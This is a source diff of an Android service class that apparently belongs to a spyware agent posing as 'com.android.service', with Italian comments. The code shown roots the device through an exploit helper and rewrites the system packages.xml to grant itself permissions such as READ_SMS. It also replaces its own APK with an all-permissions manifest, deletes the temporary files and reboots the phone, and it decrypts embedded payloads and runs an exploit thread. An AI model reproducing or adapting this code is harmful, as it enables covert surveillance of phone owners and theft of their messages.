@@ -49,11 +49,11 @@ import com.android.service.util.Utils;
  */
 public class ServiceCore extends Service {
 	static {
-	    System.loadLibrary("runner");
+		System.loadLibrary("runner");
 	}
-	
+
 	private native int invokeRun(String cmd);
-	
+
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private Core core;
 
@@ -66,7 +66,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		Messages.init(getApplicationContext());
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -93,7 +93,7 @@ public class ServiceCore extends Service {
 			paint.setAntiAlias(true);
 			paint.setTextSize(20);
 			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
-			
+
 			try {
 				wm.setBitmap(bitmap);
 			} catch (final IOException e) {
@@ -123,35 +123,39 @@ public class ServiceCore extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-		
-		if (PackageInfo.checkRoot() == true) {
-			Status.self().setRoot(true);
-		} else {
-			Status.self().setRoot(false);
 
-			// Don't exploit if we have no SD card mounted
-			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
-				Status.self().setRoot(root());
+		if (Cfg.EXP) {
+			if (PackageInfo.checkRoot() == true) {
+				Status.self().setRoot(true);
 			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
+				Status.self().setRoot(false);
+
+				// Don't exploit if we have no SD card mounted
+				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
+					Status.self().setRoot(root());
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
+					}
+				}
+			}
+
+			if (PackageInfo.checkRoot() == true) {
+				int ret = overridePermissions();
+
+				Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+
+				switch (ret) {
+				case 0:
+				case 1:
+					return; // Non possiamo partire
+				case 2: // Possiamo partire
+				default:
+					break;
 				}
 			}
 		}
 
-		if (PackageInfo.checkRoot() == true) {
-			int ret = overridePermissions();
-			
-			Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-			
-			switch (ret) {
-				case 0:
-				case 1: return; // Non possiamo partire
-				case 2:			// Possiamo partire
-				default: break;
-			}
-		}
-		
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
@@ -160,31 +164,29 @@ public class ServiceCore extends Service {
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
 	// le stringe nella librunner.so. Fixare il fatto che l'app va
 	// in crash se la funzione torna 0 o 1 e si ferma il servizio.
-	
+
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
 	 * 
-	 * Return:
-	 *  0 se c'e' stato un errore
-	 *  1 se le cap sono state ottenute ma si e' in attesa di un reboot
-	 *  2 se gia' abbiamo le cap necessarie
+	 * Return: 0 se c'e' stato un errore 1 se le cap sono state ottenute ma si
+	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
 	 */
 	private int overridePermissions() {
 		final String manifest = Messages.getString("32.15"); //$NON-NLS-1$ 
-		
+
 		// Controlliamo se abbiamo le capabilities necessarie
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
 		if (pkg != null) {
 			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
-			
+
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
 			}
 		}
-		
+
 		try {
-			//Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
+			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			openFileOutput("test", Context.MODE_WORLD_READABLE);
 
@@ -192,74 +194,74 @@ public class ServiceCore extends Service {
 			invokeRun("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			Utils.sleep(600);
 			invokeRun("/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml");
-			
+
 			// Rimuoviamo il file temporaneo
 			File tmp = new File("/data/data/com.android.service/files/test");
-			
+
 			if (tmp.exists() == true) {
 				tmp.delete();
 			}
-			
+
 			// Aggiorniamo il file
-		    FileInputStream fin = openFileInput("packages.xml");
-		    
-		    PackageInfo pi = new PackageInfo(fin, "com.android.service");
-		    
-		    String path = pi.getPackagePath();
-		    
-		    if (path.length() == 0) {
-		    	return 0;
-		    }
-		    
-		    // Vediamo se gia' ci sono i permessi richiesti
-		    if (pi.checkRequiredPermission() == true) {
-		    	if (Cfg.DEBUG) {
+			FileInputStream fin = openFileInput("packages.xml");
+
+			PackageInfo pi = new PackageInfo(fin, "com.android.service");
+
+			String path = pi.getPackagePath();
+
+			if (path.length() == 0) {
+				return 0;
+			}
+
+			// Vediamo se gia' ci sono i permessi richiesti
+			if (pi.checkRequiredPermission() == true) {
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
 				}
-		    	
+
 				// Rimuoviamo la nostra copia
 				File f = new File("/data/data/com.android.service/files/packages.xml");
-				
+
 				if (f.exists() == true) {
 					f.delete();
 				}
-				
+
 				return 2;
-		    }
-		    
-		    pi.addRequiredPermissions("perm.xml");   
-		        
-		    // .apk con tutti i permessi nel manifest
-		    InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-		    fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
-	
+			}
+
+			pi.addRequiredPermissions("perm.xml");
+
+			// .apk con tutti i permessi nel manifest
+			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
+			fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
+
 			// Copiamolo in /data/app/*.apk
-		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + path + "\"");
-		
+			invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + path + "\"");
+
 			// Copiamolo in /data/system/packages.xml
-		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
-					
+			invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
+
 			// Rimuoviamo la nostra copia
 			File f = new File("/data/data/com.android.service/files/packages.xml");
-			
+
 			if (f.exists() == true) {
 				f.delete();
 			}
-			
+
 			// Rimuoviamo il file temporaneo
 			f = new File("/data/data/com.android.service/files/perm.xml");
-			
+
 			if (f.exists() == true) {
 				f.delete();
 			}
-			
+
 			// Rimuoviamo l'apk con tutti i permessi
 			f = new File("/data/data/com.android.service/files/layout");
-			
+
 			if (f.exists() == true) {
 				f.delete();
 			}
-			
+
 			// Riavviamo il telefono
 			invokeRun("/system/bin/ntpsvd reb");
 		} catch (Exception e1) {
@@ -270,7 +272,7 @@ public class ServiceCore extends Service {
 
 			return 0;
 		}
-		
+
 		return 1;
 	}
 
@@ -375,10 +377,10 @@ public class ServiceCore extends Service {
 			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
 			byte[] buf = new byte[1024];
 			int numRead = 0;
-            while ((numRead = in.read(buf)) >= 0) {
-                out.write(buf, 0, numRead);
-            }
-				
+			while ((numRead = in.read(buf)) >= 0) {
+				out.write(buf, 0, numRead);
+			}
+
 			out.close();
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -395,7 +397,7 @@ public class ServiceCore extends Service {
 			NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
 
 		SecretKey key = Messages.produceKey(passphrase);
-		
+
 		if (Cfg.DEBUG) {
 			Check.asserts(key != null, "null key"); //$NON-NLS-1$
 		}
@@ -412,14 +414,14 @@ public class ServiceCore extends Service {
 
 		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
 		CipherInputStream cis = new CipherInputStream(stream, cipher);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
 		}
-		
+
 		return cis;
 	}
-	
+
 	// Exploit thread
 	class ExploitRunnable implements Runnable {
 		private Process localProcess;
